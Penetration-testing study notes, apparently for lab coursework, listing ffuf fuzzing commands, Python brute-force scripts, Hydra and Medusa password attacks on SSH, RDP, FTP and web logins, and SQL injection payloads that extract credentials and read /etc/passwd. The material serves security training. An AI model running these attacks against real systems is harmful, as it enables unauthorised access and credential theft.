# Proxying Tools

## 1. Proxychains
```
cat /etc/proxychains.conf

#socks4         127.0.0.1 9050
http 127.0.0.1 8080
```
```proxychains curl http://SERVER_IP:PORT```

## 2. NMAP
```nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC```

## 3. Metasploit
```
use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > set PROXIES HTTP:127.0.0.1:8080
msf6 auxiliary(scanner/http/robots_txt) > set RHOST SERVER_IP
msf6 auxiliary(scanner/http/robots_txt) > set RPORT PORT
msf6 auxiliary(scanner/http/robots_txt) > run
```

<br/><br/>
# Attacking Web Applications with Ffuf

## 1. Directory Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ```

## 2. Page Fuzzing

### 확장자 퍼징
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ```

### 페이지 퍼징
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php```

## 3. Recursive Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v```

## 4. SubDomain Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/```

## 5. Vhost Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'```

### 결과 필터링 (응답 크기는 900 예외처리)
```ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900```

## 6. Parameter Fuzzing - GET
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx```

## 7. Parameter Fuzzing - POST
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx```

## 8. Value Fuzzing
```
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

## 9. Words List
- [SecLists](https://github.com/danielmiessler/SecLists) : ```wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && unzip SecList.zip && rm -f SecList.zip```
- [Wordlists](https://github.com/3ndG4me/KaliLists.git) : ```git clone https://github.com/3ndG4me/KaliLists.git /usr/local/share/wordlists && gzip -d /usr/local/share/wordlists/rockyou.txt.gz```

<br/><br/>
# Login Brute Forcing

## 1. 비밀번호 보안

### PIN 해독하기
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## 2. 사전 공격
| 단어 목록                                       | 설명                                                          | 일반적인 사용                             | 원천                                                                                                     |
| ------------------------------------------- | ----------------------------------------------------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------ |
| `rockyou.txt`                               | RockYou 침해 사건으로 인해 수백만 개의 비밀번호가 포함된 인기 있는 비밀번호 목록이 유출되었습니다. | 일반적으로 비밀번호 무차별 대입 공격에 사용됩니다.        | [RockYou 침해 데이터 세트](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) |
| `top-usernames-shortlist.txt`               | 가장 흔한 사용자 이름을 간략하게 정리한 목록입니다.                               | 빠르고 무차별적인 사용자 이름 공격 시도에 적합합니다.      | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |
| `xato-net-10-million-usernames.txt`         | 1,000만 개에 달하는 더 광범위한 사용자 이름 목록.                             | 철저한 사용자 이름 공격에 사용됩니다.               | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |
| `2023-200_most_used_passwords.txt`          | 2023년 현재 가장 흔하게 사용된 비밀번호 200개 목록입니다.                        | 일반적으로 재사용되는 비밀번호를 타겟으로 하는 데 효과적입니다. | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |
| `Default-Credentials/default-passwords.txt` | 라우터, 소프트웨어 및 기타 장치에서 일반적으로 사용되는 기본 사용자 이름과 비밀번호 목록입니다.      | 기본 자격 증명을 시도하는 데 이상적입니다.            | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |

### 사전 대입
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## 3. 하이브리드 공격

### 비밀번호 추출
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt   # 최소 8자 길이의 비밀번호
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt    # 적어도 하나의 대문자를 포함
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt    # 적어도 하나의 소문자를 포함
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt       # 적어도 하나의 숫자가 포함
```

## 4. Hydra

### Hydra 서비스
| Hydra 서비스     | 서비스/프로토콜                         | 설명                                                                       | 예제 명령                                                                                                          |
| ------------- | -------------------------------- | ------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------- |
| FTP           | File Transfer Protocol (FTP)     | FTP 서비스에 대한 로그인 자격 증명을 무차별 대입하는 데 사용되며, 일반적으로 네트워크를 통해 파일을 전송하는 데 사용됩니다. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Secure Shell(SSH)                | 시스템에 대한 안전한 원격 로그인에 일반적으로 사용되는 자격 증명을 무차별 대입하여 SSH 서비스를 대상으로 합니다.        | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | HTTP 웹 서비스                       | GET 또는 POST 요청을 사용하여 HTTP 웹 로그인 양식에 대한 로그인 자격 증명을 무차별 대입하는 데 사용됩니다.      | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| SMTP          | Simple Mail Transfer Protocol    | SMTP(일반적으로 이메일을 보내는 데 사용됨)에 대한 로그인 자격 증명을 무차별 대입하여 이메일 서버를 공격합니다.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Post Office Protocol (POP3)      | POP3 로그인을 위해 무차별 대입 공격을 감행하여 이메일 검색 서비스를 공격합니다.                          | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Internet Message Access Protocol | 사용자가 원격으로 이메일에 접근할 수 있도록 허용하는 IMAP 서비스의 자격 증명을 무차별 대입하는 데 사용됩니다.         | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | MySQL Database                   | MySQL 데이터베이스에 대한 로그인 자격 증명을 무차별 대입하여 얻으려는 시도.                            |                                                                                                                |
| MSSQL         | Microsoft SQL Server             | Microsoft SQL 서버를 대상으로 데이터베이스 로그인 자격 증명을 무차별 대입 공격합니다.                   | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Virtual Network Computing (VNC)  | 원격 데스크톱 접속에 사용되는 VNC 서비스를 무차별 대입 공격합니다.                                  | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| RDP           | 원격 데스크톱 프로토콜(RDP)                | 원격 로그인을 무차별 대입 공격으로 Microsoft RDP 서비스를 표적으로 삼습니다.                        | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

### 무차별 대입 HTTP 인증
```hydra -L usernames.txt -P passwords.txt www.example.com http-get```

### 여러 SSH 서버를 타겟팅
```hydra -l root -p toor -M targets.txt ssh```

### 비표준 포트에서 FTP 자격 증명 테스트
```hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp```

### 웹 로그인 양식의 무차별 대입
```hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"```

### RDP 무차별 대입 공격 (6~8자의 비밀번호를 생성하고 테스트)
```hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp```

### Hydra를 사용하여 HTTP 기본 인증 활용 (포트 81)
```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

### 로그인 양식 (F=실패 조건)
```hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"```

### 로그인 양식 (S=성공 조건)
```hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"```

### Hydra를 위한 params 문자열 구성
```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## 5. Medusa

### Medusa 모듈
| Medusa Module    | Service/Protocol                 | Description                                                                                 | Usage Example                                                                                                               |
| ---------------- | -------------------------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP             | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| MySQL            | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| POP3             | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| RDP              | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| SSHv2            | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| Subversion (SVN) | Version Control System           | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |

### SSH Server 타겟팅
```medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh```

### 기본 HTTP 인증을 사용하여 여러 웹 서버 타겟팅
```medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET```

### 빈 비밀번호 또는 기본 비밀번호 테스트
```medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name```

### FTP 서버를 타겟팅
```medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5```

<br/><br/>
# 사용자 정의 단어 목록

## 1. 사용자 이름 Anarchy
```
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## 2. CUPP (Common User Passwords Profiler)
```
sudo apt install cupp -y
cupp -i    # 대화형 모드
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt   # 비밀번호 정책 적용
```

<br/><br/>
# SQL Injection
> 참고 : [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

## 1. 주석 사용

### 주석이 있는 인증 우회
```SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';```

## 2. Union 절

### 짝수 Columns
```SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '```

### 고르지 않은 Columns
```SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '```

## 3. Union Injection

### ORDER BY 사용
```
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -
```
> 알림: (-) 뒤에 공백이 있다는 것을 나타내기 위해 대시(-)를 하나 더 추가

### UNION 사용
```
cn' UNION select 1,2,3-- -
cn' UNION select 1,2,3,4-- -
```

### Injection 위치
```cn' UNION select 1,@@version,3,4-- -```

## 4. MySQL Fingerprinting

### INFORMATION_SCHEMA 데이터베이스
```cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -```<br/>
```cn' UNION select 1,database(),2,3-- -```

### TABLES
```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -```

### COLUMNS
```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -```

### Data
```cn' UNION select 1, username, password, 4 from dev.credentials-- -```

## 4. 파일 읽기

### DB User
```cn' UNION SELECT 1, user(), 3, 4-- -```<br/>
또는 ```cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -```

### 사용자 권한
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### LOAD_FILE
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```








